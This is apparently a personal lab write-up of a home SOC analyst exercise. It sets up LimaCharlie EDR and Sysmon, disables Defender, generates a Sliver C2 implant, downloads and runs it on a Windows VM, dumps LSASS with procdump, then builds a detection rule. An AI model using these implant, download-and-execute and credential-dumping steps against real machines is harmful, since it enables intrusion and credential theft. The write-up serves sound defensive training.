# SOC Analyst EDR Lab

## Objective

The Detection Lab project aimed to establish a controlled environment for simulating and detecting cyber attacks. The primary focus was to ingest and analyze the use of an EDR, generating test telemetry to mimic real-world attack scenarios. This hands-on experience was designed to deepen understanding of network security, attack patterns, and defensive strategies. 

### Skills Learned
<!--- [Bullet Points - Remove this afterwards] --->

- Detection of remote connections and creating alerts for detection.
- Proficiency in analyzing and interpreting system irregularities.
- Ability to generate and recognize attack signatures and patterns.
- Enhanced knowledge of network protocols and security vulnerabilities.
- Development of critical thinking and problem-solving skills in cybersecurity.
- Blocking an attack.
- Tuning detections to block out false positives.

### Tools Used
<!--- [Bullet Points - Remove this afterwards] --->

- EDR system (LimaCharlie) for detection and analysis of the endpoint.
- System analysis tools like sysmon to track irregularities on endpoints.
- Telemetry generation tools to create realistic network traffic and attack scenarios.

## Setup

This is a lab from a blog post. You can follow along with it [here](https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-intro). The steps in this are just a summarization of the parts.

###Part 1 - Setup a small vitrualization environment (2 small VMs)

1. Download and install VMware Workstation Pro.
2. Download and deploy a free Windows VM directly from Microsoft.
3. Download and install Ubuntu into a new VM and make sure to set a static IP on the same subnet as the Microsoft OS.
4. Set a memorable username/password (this is just a lab).
5. Install OpenSSH server on Ubuntu.
6. Continue on the Ubuntu Server install till complete. 
7. Restart Ubuntu.
8. Ping google.
``` ping -c 2 google.com ```
9. Make sure you get a similar output to below.
![image](https://github.com/user-attachments/assets/5a7b2374-4f5d-401a-bc60-a310cb825c03)
10. Next is turning on the Windows VM and disabling Defender on it.
11. Removing Tamper Protection is our first step and there are other options on the same area as them that should also be turned off. The following steps ensure that it does not turn itself back on. Setting the registry options to 4 in this part disables that tool and it will disable the main parts of Defender to stop it from starting up upon any further boots.
12. From an administrative command prompt, to prevent the VM from going into sleep/standby mode during our shenanigans.
```
powercfg /change standby-timeout-ac 0
powercfg /change standby-timeout-dc 0
powercfg /change monitor-timeout-ac 0
powercfg /change monitor-timeout-dc 0
powercfg /change hibernate-timeout-ac 0
powercfg /change hibernate-timeout-dc 0
```
These commands just change power configuration to never get triggered for a system event to turn off the computer.
13. Install Sysmon for getting granular telemetry on the Windows endpoint.
14. Install LimaCharlie and make a sensor for your endpoint on the site then install that sensor to point out to the EDR so events will be recorded.
15. After we are done with the Windows machine then move to Ubuntu to setup the attack machine. SSH from a command prompt on your computer so you can copy and paste the commands easier or just type them into your VM.
16. Now to install Sliver Linux server on the attacking machine.
```
# Download Sliver Linux server binary
wget https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux -O /usr/local/bin/sliver-server
# Make it executable
chmod +x /usr/local/bin/sliver-server
# install mingw-w64 for additional capabilities
apt install -y mingw-w64
```
17. Then make a directory to store information for later.
```
# Create our future working directory
mkdir -p /opt/sliver
```

### Part 2 - Generate our C2 payload
1. Get into root and change directory to opt/sliver/ to run sliver server for this part the lauch Sliver server
2. Generating a C2 session use the following command
   ``` generate --http [Linux_VM_IP] --save /opt/sliver ```
3. Once you've gotten it created it should show "Implate saved to [file path]/[filename].exe"
4. You can check to be sure by running the command
   ``` implants ```
![image](https://github.com/user-attachments/assets/256e52ff-5296-4e85-9f78-54cc0f5f753e)
5. In order to download the C2 you'll need to start a python temp web server with
   ``` python3 -m http.server 80 ```
6. Now you can pull the file with a admin powershell using command
   ``` IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe ```
7. Now that will pull it to your victim and make the file usable
8. In order to start up your connection will need to start up sliver server and then run http listener. Then on the victim machine you'll need to run the file with a admin cmd.
   ``` C:\Users\User\Downloads\[c2_implant].exe ```
9. Once that is running you can go back to the Ubuntu ssh. Run the command
    ``` http ```
   ![image](https://github.com/user-attachments/assets/c911a3a4-dfdc-4eb0-9c42-37a6eb17fc1f)
10. Then you can confirm your session to be able to get a remote connection by listing using
    ```sessions``` then use the session ID and then the command ```use [session ID number]```
11. Now you can get infromation about your session with ```info``` you can use this to run commands in the background as long as the connection is working as it should. You can see what things you can do with the ```getprivs``` command
![image](https://github.com/user-attachments/assets/b840c60f-5ad0-424e-995d-b62c6b7ba95a)
![image](https://github.com/user-attachments/assets/68c21d40-51d3-4261-9e9d-6143c4f578ac)
12. Now we can see connections on the pc if we use netstat and the green one will be your sliver connection
  ![image](https://github.com/user-attachments/assets/ea128754-5738-4e5d-bd10-762cfda304db)
13. Running ps -T will show you the running processes and the red hightlighted ones are a defensive measure while the green hightlight one is the sliver process

![image](https://github.com/user-attachments/assets/eb0c4d2e-db82-4f75-96ae-1ab1dc816d0b)
![image](https://github.com/user-attachments/assets/0cc86ee2-8836-49a2-b202-84fe532107c6)

15. Since we're using and EDR we want to be familiar with the processes that run, but this is my first lab and noticing after the installation of the EDR (LimaCharlie) we can identitfy network connections that are active. Through LimaCharlie go to your sensors and click the processes under the lab sensor that is installed. You can search by process name or just scroll through and see active connections with a wave next to the process.
![image](https://github.com/user-attachments/assets/67ec523c-464b-45cb-b2f3-766c26d4c65f)

16. If you click the veritcal dots and go to view network connection you'll find where the connection leads to.
![image](https://github.com/user-attachments/assets/65b873b5-c32d-45bf-8cbe-a87ecce4cc13)

17. Explore other parts of the LimaCharlie interface to find network connections and the file system.
18. You can find the hash of the file and even search in virus total to see if its known.
![image](https://github.com/user-attachments/assets/ff058b34-3483-4756-95c3-4590af8ace7f)
This file is unique since we created it and because of that its never been seen before but since we're analysts we need to trust ourselves that if something seems suspicious it should be investigated further if something doesn't seem right.
19. Inspecting timeline can show us signed processes and unsigned which might be of importance to us seeing as we're suspecting some malicious activity, but could be useful in real world scenarios to identify malicious activity.

### Part 3 - Let's Get Adversarial
1. Now that we've explored new avenues that we've created and how to detect the malicious activity we want to see about doing something all attackers want and thats get CREDENTIALS. Run the command ``` procdump -n lsass.exe -s lsass.dmp ```
2. In another lab I'll look into processing this lsass dump but for now its just an excercise to see how to get it from sliver server.

3. Now we are going back to LimaCharlie to find a SENSITIVE_PROCESS_ACCESS event that will alert us of something that is likely to be out of the ordinary.
![image](https://github.com/user-attachments/assets/b697416b-2eb9-489e-a746-c7ca22388f7c)

4. Now that we found this type of activity and understand it to be malicious we need to detect anytime this happens and setup a D&R rule. Use the following button to make a D&R rule.
![image](https://github.com/user-attachments/assets/d425bb70-22d9-402a-b8a6-1bdda41e8e1d)
5. When making the rule for this lab we can use.
```
event: SENSITIVE_PROCESS_ACCESS
op: ends with
path: event/*/TARGET/FILE_PATH
value: lsass.exe
```
The lab is not for a real world scenario because the lab admits that this rule would be noisy and not very useful without some tuning.
6. Then we tell it what to name it with in the following in the response box.
```
- action: report
  name: LSASS access
```
7. Once you've created this run the rule against the event at the bottom of the page to determine if it will work. Then save it with a name that will help with showing detections easier in the detection section.
8. Run procdump again and check detections for a new event.




*Ref 1: Network Diagram*
